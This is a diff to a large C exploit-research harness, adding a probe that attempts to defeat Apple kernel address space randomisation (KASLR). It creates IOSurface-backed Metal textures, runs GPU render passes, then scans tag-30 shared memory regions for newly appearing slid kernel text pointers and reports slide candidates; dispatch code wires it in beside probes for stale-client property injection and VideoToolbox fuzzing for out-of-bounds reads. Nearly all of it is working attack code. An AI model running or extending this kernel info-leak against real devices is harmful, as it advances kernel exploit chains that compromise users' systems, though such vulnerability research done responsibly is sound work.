@@ -15699,6 +15699,293 @@ r359_done:
     fflush(stdout);
 }
 
+/* r361: IOSurface-backed Metal texture KASLR leak
+ * Theory: creating textures from IOSurfaces forces the GPU driver to store
+ * IOSurface kext object pointers (including vtable addresses in slid kernel
+ * text) in its shared command buffer memory (tag=30 regions).
+ */
+static void r361_probe(void) {
+    rlog("\n=== r361: IOSurface-backed Metal Texture KASLR Leak ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+    void *(*msgSend)(void*,...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_NOW);
+    void *mtlDev = NULL, *cmdQ = NULL;
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) mtlDev = createDev();
+        if (mtlDev) cmdQ = ((void*(*)(void*,void*))msgSend)(mtlDev, regSel("newCommandQueue"));
+    }
+    if (!cmdQ) { rlog("  FATAL: no Metal command queue\n"); goto r361_done; }
+
+    /* ---- Part 1: Baseline scan of ALL tag=30 regions ---- */
+    rlog("--- Part 1: Baseline scan of tag=30 regions ---\n");
+    fflush(stdout);
+
+    /* Trigger initial GPU work */
+    {
+        void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+            mtlDev, regSel("newBufferWithLength:options:"), (size_t)131072, 0UL);
+        if (buf) {
+            void *cb = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+            if (cb) {
+                void *blit = ((void*(*)(void*,void*))msgSend)(cb, regSel("blitCommandEncoder"));
+                if (blit) {
+                    typedef struct { unsigned long loc; unsigned long len; } NSR361;
+                    NSR361 r = {0, 131072};
+                    ((void(*)(void*,void*,void*,NSR361,uint8_t))msgSend)(
+                        blit, regSel("fillBuffer:range:value:"), buf, r, 0xAA);
+                    ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                }
+                ((void(*)(void*,void*))msgSend)(cb, regSel("commit"));
+                ((void(*)(void*,void*))msgSend)(cb, regSel("waitUntilCompleted"));
+            }
+            ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+        }
+    }
+
+    /* Collect all tag=30 regions */
+    #define R361_MAXREG 16
+    mach_vm_address_t reg_addrs[R361_MAXREG];
+    mach_vm_size_t reg_szs[R361_MAXREG];
+    int n_regs = 0;
+    {
+        mach_vm_address_t a = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            uint32_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kr = mach_vm_region_recurse(mach_task_self(), &a, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+            if (info.user_tag == 30 && info.protection >= 3 && n_regs < R361_MAXREG) {
+                reg_addrs[n_regs] = a;
+                reg_szs[n_regs] = sz;
+                n_regs++;
+            }
+            a += sz;
+        }
+    }
+    rlog("  Found %d tag=30 regions\n", n_regs);
+
+    /* Collect baseline kernel-range values */
+    #define R361_MAXVALS 2048
+    typedef struct { uint64_t val; uint64_t addr; } kval361_t;
+    kval361_t baseline[R361_MAXVALS];
+    int n_base = 0;
+    uint64_t page_buf361[512];
+
+    for (int r = 0; r < n_regs; r++) {
+        for (mach_vm_address_t pg = reg_addrs[r]; pg < reg_addrs[r] + reg_szs[r]; pg += 4096) {
+            mach_vm_size_t out_sz = 0;
+            kr = mach_vm_read_overwrite(mach_task_self(), pg, 4096,
+                (mach_vm_address_t)page_buf361, &out_sz);
+            if (kr != KERN_SUCCESS) continue;
+            size_t nqw = (size_t)out_sz / 8;
+            for (size_t i = 0; i < nqw; i++) {
+                uint64_t v = page_buf361[i];
+                if (v >= 0xFFFFFFF000000000ULL && v < 0xFFFFFFFF00000000ULL && n_base < R361_MAXVALS) {
+                    baseline[n_base].val = v;
+                    baseline[n_base].addr = pg + i * 8;
+                    n_base++;
+                }
+            }
+        }
+    }
+    rlog("  Baseline: %d kernel-range values in tag=30 regions\n", n_base);
+
+    /* ---- Part 2: Create IOSurface-backed Metal textures ---- */
+    rlog("\n--- Part 2: Create IOSurface-backed textures ---\n");
+    fflush(stdout);
+
+    #define R361_NTEX 32
+    IOSurfaceRef tex_surfs[R361_NTEX];
+    void *tex_objs[R361_NTEX];
+    memset(tex_surfs, 0, sizeof(tex_surfs));
+    memset(tex_objs, 0, sizeof(tex_objs));
+    int n_tex = 0;
+
+    int tw = 256, th = 256;
+    CFStringRef kw = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kh = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kb = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kr_ = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kp = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef ka = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    int vw = tw, vh = th, vb = 4, vr = tw * 4, vp = 0x42475241, va = tw * th * 4;
+    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &vw);
+    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &vh);
+    CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &vb);
+    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &vr);
+    CFNumberRef np = CFNumberCreate(NULL, kCFNumberIntType, &vp);
+    CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &va);
+    CFStringRef keys361[] = {kw, kh, kb, kr_, kp, ka};
+    CFTypeRef vals361[] = {nw, nh, nb, nr, np, na};
+    CFDictionaryRef props361 = CFDictionaryCreate(NULL,
+        (const void**)keys361, (const void**)vals361, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    /* Create MTLTextureDescriptor for 2D BGRA8Unorm */
+    void *texDesc = ((void*(*)(void*,void*))msgSend)(
+        ((void*(*)(void*,void*))msgSend)((void*)objc_getClass("MTLTextureDescriptor"), regSel("alloc")),
+        regSel("init"));
+    if (texDesc) {
+        ((void(*)(void*,void*,unsigned long))msgSend)(texDesc, regSel("setPixelFormat:"), 80UL); /* MTLPixelFormatBGRA8Unorm */
+        ((void(*)(void*,void*,unsigned long))msgSend)(texDesc, regSel("setWidth:"), (unsigned long)tw);
+        ((void(*)(void*,void*,unsigned long))msgSend)(texDesc, regSel("setHeight:"), (unsigned long)th);
+        ((void(*)(void*,void*,unsigned long))msgSend)(texDesc, regSel("setUsage:"), 5UL); /* read+write+render */
+    }
+
+    for (int i = 0; i < R361_NTEX; i++) {
+        tex_surfs[i] = IOSurfaceCreate(props361);
+        if (!tex_surfs[i]) continue;
+
+        /* Create Metal texture backed by this IOSurface */
+        void *tex = ((void*(*)(void*,void*,void*,IOSurfaceRef,unsigned long))msgSend)(
+            mtlDev, regSel("newTextureWithDescriptor:iosurface:plane:"),
+            texDesc, tex_surfs[i], 0UL);
+        tex_objs[i] = tex;
+        if (tex) n_tex++;
+    }
+    rlog("  Created %d IOSurface-backed Metal textures (%dx%d BGRA)\n", n_tex, tw, th);
+
+    /* ---- Part 3: GPU rendering using IOSurface textures ---- */
+    rlog("\n--- Part 3: GPU rendering with IOSurface textures ---\n");
+    fflush(stdout);
+
+    /* Use render passes targeting IOSurface textures as render targets.
+       This forces the GPU driver to deeply resolve the IOSurface backing,
+       creating kernel-level tracking structures with kext pointers. */
+    for (int pass = 0; pass < 8; pass++) {
+        for (int i = 0; i < n_tex; i++) {
+            if (!tex_objs[i]) continue;
+            void *cb = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+            if (!cb) continue;
+
+            /* Create a render pass descriptor targeting this IOSurface texture */
+            void *rpd = ((void*(*)(void*,void*))msgSend)(
+                (void*)objc_getClass("MTLRenderPassDescriptor"), regSel("renderPassDescriptor"));
+            if (rpd) {
+                void *colorAttachs = ((void*(*)(void*,void*))msgSend)(rpd, regSel("colorAttachments"));
+                void *att0 = ((void*(*)(void*,void*,unsigned long))msgSend)(
+                    colorAttachs, regSel("objectAtIndexedSubscript:"), 0UL);
+                if (att0) {
+                    ((void(*)(void*,void*,void*))msgSend)(att0, regSel("setTexture:"), tex_objs[i]);
+                    ((void(*)(void*,void*,unsigned long))msgSend)(att0, regSel("setLoadAction:"), 2UL); /* clear */
+                    ((void(*)(void*,void*,unsigned long))msgSend)(att0, regSel("setStoreAction:"), 1UL); /* store */
+                }
+                void *enc = ((void*(*)(void*,void*,void*))msgSend)(
+                    cb, regSel("renderCommandEncoderWithDescriptor:"), rpd);
+                if (enc) {
+                    ((void(*)(void*,void*))msgSend)(enc, regSel("endEncoding"));
+                }
+            }
+            ((void(*)(void*,void*))msgSend)(cb, regSel("commit"));
+            ((void(*)(void*,void*))msgSend)(cb, regSel("waitUntilCompleted"));
+        }
+
+        /* Also alloc+free a buffer to stir the kernel heap */
+        void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+            mtlDev, regSel("newBufferWithLength:options:"), (size_t)(65536 * (pass + 1)), 0UL);
+        if (buf) ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+    }
+    rlog("  Completed 8 GPU render passes across %d IOSurface textures\n", n_tex);
+
+    /* ---- Part 4: Rescan tag=30 regions for new kernel pointers ---- */
+    rlog("\n--- Part 4: Post-texture heap scan ---\n");
+    fflush(stdout);
+
+    kval361_t post[R361_MAXVALS];
+    int n_post = 0;
+
+    for (int r = 0; r < n_regs; r++) {
+        for (mach_vm_address_t pg = reg_addrs[r]; pg < reg_addrs[r] + reg_szs[r]; pg += 4096) {
+            mach_vm_size_t out_sz = 0;
+            kr = mach_vm_read_overwrite(mach_task_self(), pg, 4096,
+                (mach_vm_address_t)page_buf361, &out_sz);
+            if (kr != KERN_SUCCESS) continue;
+            size_t nqw = (size_t)out_sz / 8;
+            for (size_t i = 0; i < nqw; i++) {
+                uint64_t v = page_buf361[i];
+                if (v >= 0xFFFFFFF000000000ULL && v < 0xFFFFFFFF00000000ULL && n_post < R361_MAXVALS) {
+                    post[n_post].val = v;
+                    post[n_post].addr = pg + i * 8;
+                    n_post++;
+                }
+            }
+        }
+    }
+    rlog("  Post-texture: %d kernel-range values in tag=30 regions\n", n_post);
+
+    /* Find new values not in baseline */
+    int new_text = 0, new_heap = 0;
+    static const uint64_t skip361[] = {
+        0xFFFFFFF007004000ULL, 0xFFFFFFF007000000ULL, 0xFFFFFFF027004000ULL,
+        0xFFFFFFF037004000ULL, 0xFFFFFFF047004000ULL, 0xFFFFFFF017004000ULL,
+        0xFFFFFFF00F004000ULL, 0xFFFFFFF000000000ULL, 0xFFFFFFF800000000ULL,
+    };
+
+    for (int p = 0; p < n_post; p++) {
+        uint64_t v = post[p].val;
+        /* Skip known constants */
+        int is_const = 0;
+        for (int k = 0; k < (int)(sizeof(skip361)/sizeof(skip361[0])); k++)
+            if (v == skip361[k]) { is_const = 1; break; }
+        if (is_const) continue;
+
+        /* Check if this was in baseline */
+        int was_in_base = 0;
+        for (int b = 0; b < n_base; b++) {
+            if (baseline[b].val == v) { was_in_base = 1; break; }
+        }
+        if (was_in_base) continue;
+
+        /* NEW value! Classify it */
+        if (v >= 0xFFFFFFF007004001ULL && v < 0xFFFFFFF027004000ULL) {
+            rlog("  *** NEW SLID TEXT: addr=0x%llx val=0x%llx (off=+0x%llx) ***\n",
+                (unsigned long long)post[p].addr, (unsigned long long)v,
+                (unsigned long long)(v - 0xFFFFFFF007004000ULL));
+            new_text++;
+        } else if (v >= 0xFFFFFFFE00000000ULL) {
+            if (new_heap < 10)
+                rlog("  NEW HEAP: addr=0x%llx val=0x%llx\n",
+                    (unsigned long long)post[p].addr, (unsigned long long)v);
+            new_heap++;
+        } else {
+            rlog("  NEW OTHER: addr=0x%llx val=0x%llx\n",
+                (unsigned long long)post[p].addr, (unsigned long long)v);
+        }
+    }
+
+    rlog("\n  Summary: %d new text ptrs, %d new heap ptrs (from %d baseline, %d post)\n",
+        new_text, new_heap, n_base, n_post);
+
+    if (new_text > 0) {
+        rlog("  *** KASLR SLIDE CANDIDATES FOUND ***\n");
+        rlog("  Compute: slide = text_ptr - known_unslid_symbol\n");
+    }
+
+    /* Cleanup */
+    for (int i = 0; i < R361_NTEX; i++) {
+        if (tex_objs[i]) ((void(*)(void*,void*))msgSend)(tex_objs[i], regSel("release"));
+        if (tex_surfs[i]) CFRelease(tex_surfs[i]);
+    }
+    if (texDesc) ((void(*)(void*,void*))msgSend)(texDesc, regSel("release"));
+    CFRelease(props361);
+    CFRelease(kw); CFRelease(kh); CFRelease(kb); CFRelease(kr_); CFRelease(kp); CFRelease(ka);
+    CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(nr); CFRelease(np); CFRelease(na);
+
+r361_done:
+    if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
+    if (metal_lib) dlclose(metal_lib);
+    rlog("\n=== r361 complete ===\n");
+    fflush(stdout);
+}
+
 /* r358: Scan ALL readable VM regions for slid kernel text pointers */
 static void r358_probe(void) {
     rlog("\n=== r358: Slid Kernel Text Pointer Scan (ALL regions) ===\n\n");
@@ -53774,6 +54061,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 364) {
+            rlog("*** rounds=364: IOSurface-backed Metal Texture KASLR Leak ***\n");
+            rlog("  Creating IOSurface-backed textures, triggering GPU ops,\n");
+            rlog("  scanning heap channel for IOSurface kext vtable pointers.\n\n");
+            fflush(stdout);
+            r361_probe();
+            goto done;
+        }
         if (rounds == 363) {
             rlog("*** rounds=363: IOSurface Property Injection + Backing Store Confusion ***\n");
             rlog("  Testing: internal property injection via stale client,\n");
@@ -55890,7 +56185,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -65732,7 +66027,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
